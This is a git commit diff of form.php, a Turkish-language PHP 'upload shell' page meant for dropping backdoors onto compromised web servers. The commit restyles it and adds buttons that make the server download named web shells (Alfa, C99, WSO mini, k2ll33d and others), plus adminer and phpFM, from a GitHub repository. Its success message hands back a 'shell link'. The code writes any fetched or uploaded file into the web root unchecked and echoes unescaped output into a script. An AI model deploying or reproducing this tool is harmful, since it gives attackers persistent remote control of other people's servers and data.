0167ea4646685ec1032f23103eaf3ae067aab7d7
PatroeN Development <110349223+PatroenDev@users.noreply.github.com>
2024-05-19 12:56:41 +0300

    Update form.php

--- form.php
+++ form.php
@@ -2,70 +2,57 @@
 <html>
 <head>
     <style>
-    
-    /* POEİCE UPLOAD SHELL*/
-        @keyframes glitch {
-            0% { transform: none; }
-            20% { transform: translate(-1px, -1px); }
-            40% { transform: translate(1px, 1px); }
-            60% { transform: translate(-1px, 1px); }
-            80% { transform: translate(1px, -1px); }
-            100% { transform: none; }
-        }
         body {
             font-family: 'Courier New', Courier, monospace;
             background-color: #000;
-            color: #0f0;
+            color: #ffa500;
             margin: 0;
             padding: 0;
         }
         .upload-form {
-            background-color: #111;
+            background-color: #1c1c1c;
             width: 400px;
             margin: 50px auto;
             padding: 20px;
             border-radius: 10px;
-            border: 1px solid #0f0;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            border: 1px solid #ffa500;
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
         }
         .upload-form h2 {
             text-align: center;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
+            color: #ffa500;
+            text-shadow: 0 0 5px #ffa500;
         }
         .upload-form p {
-            color: #0f0;
-            text-shadow: 0 0 3px #0f0;
+            color: #ffa500;
+            text-shadow: 0 0 3px #ffa500;
         }
         .upload-form input[type="file"] {
             margin-bottom: 10px;
             background-color: #000;
-            border: 1px solid #0f0;
-            color: #0f0;
+            border: 1px solid #ffa500;
+            color: #ffa500;
             padding: 5px;
             border-radius: 5px;
-        }
-        .upload-form input[type="file"]::placeholder {
-            color: #0f0;
+            width: 100%;
         }
         .upload-form input[type="submit"] {
-            background-color: #f00;
+            background-color: #ffa500;
             color: #000;
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s;
-            animation: glitch 0.2s infinite alternate;
+            width: 100%;
         }
         .upload-form input[type="submit"]:hover {
-            background-color: #ff4444;
+            background-color: #ffcc66;
         }
         .message {
             text-align: center;
             margin-top: 20px;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
+            color: #ffa500;
+            text-shadow: 0 0 5px #ffa500;
         }
         .message a {
             color: #00f;
@@ -79,102 +66,102 @@
             margin-top: 20px;
         }
         .hack-button {
-            background-color: #f00;
+            background-color: #ffa500;
             color: #000;
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s;
             margin: 5px;
-            animation: glitch 0.2s infinite alternate;
+            width: calc(100% - 10px);
         }
         .hack-button:hover {
-            background-color: #ff4444;
+            background-color: #ffcc66;
         }
-        .poeice {
-            text-align: center;
-            margin-top: 20px;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
-            animation: glitch 0.2s infinite alternate;
-        }
-        body{
+        body {
             position: relative;
-    display: flex;
-    flex-direction: column;
-    min-height: 100vh;
-    background: #000 url(https://www.turkhacks.com/styles/darkgreen/bg.gif);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background: #000;
         }
     </style>
 </head>
 <body>
     <div class="upload-form">
-        <h2>PatroeN Upload Form</h2>
+        <h2>Yükleme Formu</h2>
         <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
             <p>Bir dosya seç ve avla :)</p>
             <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
             <input type="submit" value="Yükle">
         </form>
         <div class="message">
-            Upload
+            PatroeN
         </div>
-<div class="hack-buttons">
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
-</div>
-<br>
-<script>
-    function uploadFile(url) {
-        // Get the form element
-        var form = document.querySelector('.upload');
+        <div class="upload-message"></div>
+        <div class="hack-buttons">
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/3.php')">C99 Yükle</button>
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/4.php')">WsoMini Yükle</button>
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/5.php')">k2ll33d Yükle</button>
+            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/6.php')">spademini Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/7.php')">Crackmeci Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/phpinfo.php')">phpinfo Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/adminer.php')">Adminer Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/phpfm.php')">phpFM Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/upload.php')">upload Yükle</button>
+			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/upload2.php')">upload2 Yükle</button>
+        </div>
+    </div>
+    
+    <script>
+        function uploadFile(url) {
+            // Get the form element
+            var form = document.querySelector('.upload');
 
-        // Append a hidden input field with the URL value
-        var urlInput = document.createElement('input');
-        urlInput.type = 'hidden';
-        urlInput.name = 'url';
-        urlInput.value = url;
-        form.appendChild(urlInput);
+            // Append a hidden input field with the URL value
+            var urlInput = document.createElement('input');
+            urlInput.type = 'hidden';
+            urlInput.name = 'url';
+            urlInput.value = url;
+            form.appendChild(urlInput);
 
-        // Submit the form
-        form.submit();
-    }
-</script>
+            // Submit the form
+            form.submit();
+        }
+    </script>
 
-
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    if (isset($_POST["url"])) {
-        $url = $_POST["url"];
-        $fileContent = file_get_contents($url);
-        if ($fileContent !== false) {
-            $fileName = basename($url);
-            $uploadDirectory = "";
-            if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
-                echo "<div class='message'>Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName'  target='_blank'>$uploadDirectory$fileName</a></div>";
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $message = "";
+        if (isset($_POST["url"])) {
+            $url = $_POST["url"];
+            $fileContent = file_get_contents($url);
+            if ($fileContent !== false) {
+                $fileName = basename($url);
+                $uploadDirectory = "";
+                if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
+                    $message = "Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName' target='_blank'>$uploadDirectory$fileName</a>";
+                } else {
+                    $message = "Dosya yüklenirken bir hata oluştu!";
+                }
             } else {
-                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
+                $message = "Dosya indirilirken bir hata oluştu!";
             }
         } else {
-            echo "<div class='message'>Dosya indirilirken bir hata oluştu!</div>";
-        }
-    } else {
-        if (!empty($_FILES['uploaded_file'])) {
-            $uploadKlasoru = "";
-            $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
-            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
-                echo "<div class='message'>Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla hacklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a></div>";
-            } else {
-                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
+            if (!empty($_FILES['uploaded_file'])) {
+                $uploadKlasoru = "";
+                $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
+                if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
+                    $message = "Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla hacklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a>";
+                } else {
+                    $message = "Dosya yüklenirken bir hata oluştu!";
+                }
             }
         }
+        echo "<script>document.querySelector('.upload-message').innerHTML = \"$message\";</script>";
     }
-}
-?>
-
+    ?>
 </body>
 </html>
